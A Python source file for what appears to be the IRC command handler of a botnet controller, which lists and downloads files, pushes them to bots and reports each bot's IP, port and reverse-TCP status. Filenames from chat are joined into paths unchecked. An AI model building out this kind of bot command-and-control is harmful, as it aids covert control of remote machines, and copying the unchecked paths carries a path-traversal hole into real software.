import logging
import datetime
import os
import threading
from web import http_services

class CommandHandler:
    def __init__(self, context, botnetDB, irc_connection) -> None:
        self.myContext = context
        self.botnetDB = botnetDB
        self.irc_connection = irc_connection
        
        self.irc_connection.onCommandLS.subscribe(self.irc_onCommandLS)
        self.irc_connection.onCommandSTAT.subscribe(self.irc_onCommandSTAT)
        self.irc_connection.onCommandSEND.subscribe(self.irc_onCommandSEND)
        self.irc_connection.onCommandHELP.subscribe(self.irc_onCommandHELP)
        self.irc_connection.onCommandSTATUS.subscribe(self.irc_onCommandSTATUS)
        self.irc_connection.onCommandWGET.subscribe(self.irc_onCommandWGET)

        self.irc_connection.onCommandFILES.subscribe(self.irc_onCommandFILES)


    def irc_onCommandLS(self, *args, **kwargs):
        irc_connection = args[0]
        nickname = kwargs.get('nickname')
        files = self.list_files()
        irc_connection.send_query(nickname, f"FILES {files}")


    def irc_onCommandSTAT(self, *args, **kwargs):
        irc_connection = args[0]
        filename = kwargs.get('filename')
        nickname = kwargs.get('nickname')
        file_info = self.get_file_info(filename)

        if file_info is None:
            irc_connection.send_query(nickname, f"No such file: {filename}")
            return

        modified_time = datetime.datetime.fromtimestamp(file_info['modified']).strftime('%Y-%m-%d %H:%M:%S')
        file_info['modified'] = modified_time
        file_size_mb = file_info['size'] / (1024 * 1024)
        file_info['size'] = f"{round(file_size_mb, 2)} MB"
        irc_connection.send_query(nickname, f"FILE_INFO {file_info}")


    def irc_onCommandSEND(self, *args, **kwargs):
        irc_connection = args[0]
        filename = kwargs.get('filename')
        receiver = kwargs.get('receiver')
        nickname = kwargs.get('nickname')

        file_path = os.path.join(self.myContext.pathToFiles, filename)

        if not os.path.exists(file_path):
            irc_connection.send_query(nickname, f"No such file: {filename}")
            return

        bot = self.botnetDB.get_bot(receiver)
        if bot is None:
            irc_connection.send_query(nickname, f"Bot {receiver} not found")
            return

        tcpSession = bot.get_active_tcp_session()
        if tcpSession is None:
            irc_connection.send_query(nickname, f"Bot {receiver} has no active connections")
            return  

        if tcpSession.isSendingData:
            irc_connection.send_query(nickname, f"Bot {receiver} is busy sending other file")
            return
        
        thread = threading.Thread(target=tcpSession.send_file, args=(file_path,), kwargs={'nickname': nickname, 'receiver': receiver})
        thread.start()
        
        irc_connection.send_query(nickname, f"Transfer of {filename} to {receiver} started")

    
    def irc_onCommandHELP(self, *args, **kwargs):
        irc_connection = args[0]
        nickname = kwargs.get('nickname')
        irc_connection.send_query(nickname, "HELP: HELP, LS, SEND, STATUS, STAT, WGET")


    def irc_onCommandSTATUS(self, *args, **kwargs):
        irc_connection = args[0]
        nickname = kwargs.get('nickname')
        irc_connection.send_query(nickname, f"STATUS: {len(self.botnetDB.get_bots())} bots connected")

        for bot in self.botnetDB.get_bots().values():
            info = f"BOT: {bot.get_ircNick()} {bot.get_ip()}:{bot.get_port()}"
            tcpSession = bot.get_tcp_session()
            if tcpSession.isActive:
                info += f" TCP connection: [active]"
            else:
                info += f" TCP connection: [inactive]"
            
            tcpSession = bot.get_reversed_tcp_session()
            if tcpSession.isActive:
                info += f" Reversed TCP connection: [active]"
            else:
                info += f" Reversed TCP connection: [inactive]"

            irc_connection.send_query(nickname, info)
            
            info = f"BOT {bot.get_ircNick()} files: {bot.fileList}"
            irc_connection.send_query(nickname, info)

            info = f"BOT {bot.get_ircNick()} files last refreshed: {bot.fileListRefreshTime}"
            irc_connection.send_query(nickname, info)

    
    def irc_onCommandWGET(self, *args, **kwargs):
        irc_connection = args[0]
        nickname = kwargs.get('nickname')
        url = kwargs.get('url')
        filename = url.split('/')[-1]
        savePath = os.path.join(self.myContext.pathToFiles, filename)
        
        downloader = http_services.FileDownloader(url)
        downloader.onDownloadCompleted.subscribe(self.downloader_onDownloadCompleted)
        downloader.onDownloadProgress.subscribe(self.downloader_onDownloadProgress)

        thread = threading.Thread(target=downloader.download_file, args=(savePath,), kwargs={'nickname' : nickname})
        thread.start()
        irc_connection.send_query(nickname, f"Downloading of {url} started")


    def irc_onCommandFILES(self, *args, **kwargs):
        nickname = kwargs.get('nickname')
        files = kwargs.get('files')

        bot = self.botnetDB.get_bot(nickname)
        if bot is None:
            logging.warning(f"Bot not found: nick: {nickname}")
            return
        
        bot.fileList = files
        bot.fileListRefreshTime = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')


    def downloader_onDownloadCompleted(self, *args, **kwargs):
        irc_connection = self.irc_connection
        nickname = kwargs.get('nickname')
        filename = kwargs.get('filename')
        filesize = kwargs.get('filesize')
        tput = kwargs.get('tput')
        time = kwargs.get('time')
        irc_connection.send_query(nickname, f"File {filename} downloaded successfully. Size: {filesize} MB, Time: {time} s, Throughput: {tput} MB/s")


    def downloader_onDownloadProgress(self, *args, **kwargs):
        irc_connection = self.irc_connection
        nickname = kwargs.get('nickname')
        filename = kwargs.get('filename')
        progress = kwargs.get('progress')
        tput = kwargs.get('tput')
        progress_size = kwargs.get('progress_size')
        full_size = kwargs.get('full_size')
        irc_connection.send_query(nickname, f"Downloading {filename}: {progress}%, {progress_size} out of {full_size} MB, Throughput: {tput} MB/s")


    def get_file_info(self, filename):
        file_path = os.path.join(self.myContext.pathToFiles, filename)
        try:
            file_size = os.path.getsize(file_path)
            file_modified = os.path.getmtime(file_path)
            file_info = {
                'filename': filename,
                'size': file_size,
                'modified': file_modified
            }
            return file_info
        except Exception as e:
            logging.error(f"Error getting file info: {str(e)}")
            return None
        

    def list_files(self):
        files = []
        try:
            files = os.listdir(self.myContext.pathToFiles)
        except Exception as e:
            logging.error(f"Error listing files: {str(e)}")
        return files
    